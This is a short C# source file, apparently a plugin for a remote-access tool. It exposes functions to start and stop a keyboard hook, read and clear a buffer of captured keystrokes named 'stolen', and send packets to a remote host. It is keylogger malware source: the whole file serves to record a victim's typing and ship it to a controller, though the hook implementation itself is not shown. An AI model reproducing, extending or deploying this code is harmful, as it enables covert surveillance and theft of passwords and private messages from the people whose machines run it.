using PacketLib;
using PacketLib.Utils;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public class Launch
    {
        public static void Start()
        {
            KeyLib.Hook.StartHooking();
        }

        public static string CurrentKeyStroke() 
        {
            return KeyLib.Hook.stolen.ToString();
        }

        public static void ClearKeyStroke()
        {
            KeyLib.Hook.stolen.Clear();
        }

        public static void StopHook() 
        {
            KeyLib.Hook.AbortHook();
        }

        public static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
